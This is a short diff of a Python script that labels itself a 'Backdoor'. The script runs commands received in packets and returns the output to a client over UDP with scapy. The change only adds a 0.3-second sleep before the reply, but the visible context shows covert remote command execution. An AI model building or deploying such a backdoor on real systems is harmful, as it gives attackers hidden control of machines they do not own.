@@ -2,6 +2,7 @@ import argparse, setproctitle, subprocess
 from scapy.all import *
 from Crypto.Cipher import AES
 from scapy.layers.inet import IP, UDP
+from time import sleep
 
 parser = argparse.ArgumentParser(description="Backdoor")
 # parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
@@ -19,6 +20,7 @@ def parse_command(packet):
     output = proc.stdout.read()
     print (output)
     # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
+    sleep(0.3) #try giving the client time to recevie.
     pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(sport=int(args.server_port), dport=int(args.client_port))/output
     send(pkt)
 
